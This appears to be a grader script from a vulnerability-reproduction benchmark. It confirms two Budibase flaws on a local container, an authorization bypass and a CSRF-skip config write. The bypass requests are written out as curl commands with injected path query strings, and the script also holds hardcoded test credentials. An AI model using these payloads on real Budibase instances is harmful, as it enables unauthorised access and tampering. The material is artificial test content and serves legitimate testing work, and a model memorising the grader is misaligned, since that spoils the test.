#!/usr/bin/env bash
# verify.sh --seed|--residual — budibase CVE-2026-31816 (seed: server authz bypass,
# status != 401) / CVE-2026-48147 (residual: worker CSRF-skip state-write, readback==REF)。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
# Capture the run's true flag before compose.env (start persists PCB_FLAG=true token).
REF="${RUN_FLAG_REF:-}"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
REF="${REF:-${PCB_FLAG:-$RUN_FLAG}}"
# Controller contract: RUN_FLAG is the submitted token (override on wrong/stale);
# RUN_FLAG_REF / start PCB_FLAG is the true flag. Seed is authz-status only, so
# wrong/stale must not pass just because residual can write whichever string it
# was given. Fail closed before any mutate.
if [[ "$RUN_FLAG" != "$REF" ]]; then
  echo "verify: rejected wrong/stale submitted flag"
  exit 10
fi
case "$VERSION" in
  v0) PORT="${PORT_V0_0:-10080}";;
  v1) PORT="${PORT_V1_0:-10081}";;
  v2) PORT="${PORT_V2_0:-10082}";;
  *) PORT=10080;;
esac
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
BASE="http://127.0.0.1:$PORT"
# One ready loop only (verify timeout is 600s). Seed needs server /api/tables;
# residual needs worker public configs (can lag tables).
READY_PATH="/api/tables"
[[ "$MODE" == "--residual" ]] && READY_PATH="/api/global/configs/public"
for _ in $(seq 1 45); do
  RC="$(curl -sS -m 10 -o /dev/null -w "%{http_code}" "$BASE$READY_PATH" 2>/dev/null || echo 000)"
  [[ "$RC" != "502" && "$RC" != "000" && "$RC" != "503" ]] && break
  sleep 8
done
echo "ready_status=$RC path=$READY_PATH"

if [[ "$MODE" == "--seed" ]]; then
  # 无注入 baseline 必须 401；webhook 模式注入后 guard 被跳过 -> 非 401（v0）；v1 修复 -> 仍 401
  B1="$(curl -sS -m 25 -o /dev/null -w "%{http_code}" "$BASE/api/tables")"
  A1="$(curl -sS -m 25 -o /dev/null -w "%{http_code}" "$BASE/api/tables?/webhooks/trigger")"
  echo "baseline=$B1 attack=$A1"
  if [[ "$B1" == "401" && "$A1" != "401" ]]; then exit 0; else exit 10; fi
  exit 0
fi

# --- residual: worker CSRF-skip 状态写 + public readback ---
COOKIE="/tmp/pcb_bb86_${RUN_ID}.txt"
CSRF=""
for _ in $(seq 1 8); do
  rm -f "$COOKIE"
  curl -sS -m 25 -X POST "$BASE/api/global/users/init" \
    -H 'content-type: application/json' \
    -d '{"email":"admin@pcb.test","password":"Passw0rd!PCB","tenantId":"default"}' >/dev/null 2>&1
  curl -sS -m 25 -c "$COOKIE" -X POST "$BASE/api/global/auth/default/login" \
    -H 'content-type: application/json' \
    -d '{"username":"admin@pcb.test","password":"Passw0rd!PCB"}' >/dev/null 2>&1
  CSRF="$(curl -sS -m 25 -b "$COOKIE" "$BASE/api/global/self" | python3 -c "import json,sys
try:
    print(json.load(sys.stdin).get('csrfToken',''))
except Exception:
    print('')" 2>/dev/null)"
  [[ -n "$CSRF" ]] && break
  sleep 5
done
# 合法写回基线
curl -sS -m 25 -b "$COOKIE" -X POST "$BASE/api/global/configs" \
  -H 'content-type: application/json' -H "x-csrf-token: $CSRF" \
  -d '{"type":"settings","config":{"company":"ResetBase"}}' >/dev/null 2>&1
# control：无注入 -> 期望 403（CSRF 拦截）
CTL="$(curl -sS -m 25 -b "$COOKIE" -X POST "$BASE/api/global/configs" \
  -H 'content-type: application/x-www-form-urlencoded' \
  --data-urlencode 'type=settings' --data-urlencode 'config[company]=NOFLAG_ctl' \
  -o /dev/null -w "%{http_code}")"
# attack：public-route 注入 + submitted token；judge against REF (true flag)
ATK="$(curl -sS -m 25 -b "$COOKIE" -X POST "$BASE/api/global/configs?a=/api/global/auth/x" \
  -H 'content-type: application/x-www-form-urlencoded' \
  --data-urlencode 'type=settings' --data-urlencode "config[company]=$RUN_FLAG" \
  -o /dev/null -w "%{http_code}")"
RB="$(curl -sS -m 25 "$BASE/api/global/configs/public")"
echo "ctl=$CTL atk=$ATK readback=$(printf '%s' "$RB" | head -c 150)"
if [[ "$CTL" == "403" ]] && printf '%s' "$RB" | grep -q "$REF"; then
  exit 0
else
  exit 10
fi
